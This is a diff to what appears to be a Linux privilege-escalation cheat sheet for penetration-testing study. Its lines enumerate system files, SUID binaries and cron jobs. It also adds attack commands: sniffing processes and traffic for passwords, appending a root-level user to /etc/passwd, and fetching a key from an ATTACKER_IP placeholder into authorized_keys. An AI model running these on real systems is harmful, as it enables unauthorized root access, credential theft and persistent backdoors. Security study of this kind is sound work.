@@ -8,14 +8,15 @@ id      #View current User info
 cat /etc/passwd      #View passwd file
 hostname      #view system hostname
 
+
 #OS Version Info
 cat   /etc/issue      #os version
 cat   /etc/os-release      #
 cat /etc/*-release    #
 uname -a      #OS Kernel/Architecture Version
 
-#Running Services and Processes
 
+#Running Services and Processes
 ps aux      #View system processes (including those run by privileged users) 
 
 
@@ -27,26 +28,33 @@ ss -anp      #Display active network connections and listening ports
 netstat -anp    #Display active network connections and listening ports
 cat /etc/iptables/rules.v4      #Inspecting custom IP tables
 
-#Enumerate Scheduled tasks
+
+#Scheduled tasks
 ls -lah /etc/cron*      #List the contents of all cron directories
 cat /etc/crontab      #Viewing /etc/crontab file
 crontab -l      #View the current user's scheduled jobs
 sudo crontab -l      #Listing cron jobs using sudo reveals jobs run by the root user
+grep "CRON" /var/log/syslog    #Inspect the cron log file (/var/log/cron.log) for running cron jobs with write permissions etc.
+
 
 #Installed applications
 dpkg -l      #list applications installed by dpkg on our Debian system
 
+
 #Find writable Locations
 find / -writable -type d 2>/dev/null      #Searching for every directory writable by the current user
+
 
 #Disks and Mounts
 cat /etc/fstab      #List all mounted filesystems.
 mount      #Lists all drives that will be mounted at boot time.
 lsblk      #Use lsblk to view all available disks
 
+
 #Device Drivers and Kernel Modules
 lsmod    #Enumerate the loaded kernel modules using lsmod without any additional arguments
 /sbin/modinfo libata      #Displaying additional information about the example libata module
+
 
 #SETUID & SETGID
 find / -perm -u=s -type f 2>/dev/null      #search for SUID-marked binaries
@@ -57,13 +65,35 @@ find / -perm -g=s -type f 2>/dev/null    #??
 env    #Sometimes administrators store credentials inside environment variables
 cat .bashrc    #Inspect .bashrc file for custom env variables
 
+
 #SU
 su - root    #Try to su as root 
 
 
+#Sudo
+sudo -l    #Sudo capabilities of current user
+sudo -i    #Elevate directly to root by running i with sudo and supplying eve's or other admins credentials.
+
+#Inspecting Running Processes for Secrets
+watch -n 1 "ps -aux | grep pass"    #Run the ps command every second via the watch utility and grep the results on any occurrence of the word "pass"
 
 
+#TcpDump to Inspect Traffic (cannot be run without sudo permissions)
+#sudo tcpdump -i lo -A | grep "pass"    #capture traffic in and out of the loopback interface, dump its content in ASCII using  -A parameter. Filter traffic for the word "pass"
 
+
+#Writing to /etc/passwd
+openssl passwd w00t    #Create a password
+echo "root2:outputofpreviouscommand:0:0:root:/root:/bin/bash" >> /etc/passwd    #Create new user in passwd file using created password
+su root2      #Elevate Privs with su
+
+
+#Overwriting SSH id_rsa/authorized keys
+#echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys    #Add public key to authorized keys
+
+
+#Setuid, Linux Capabilities and GTFO Bins
+/usr/sbin/getcap -r / 2>/dev/null    #Manually Enumerating Linux Capabilities for setuid capabilities enabled, along with the +ep flag specifying that capabilities are effective and permitted.
 
 
 
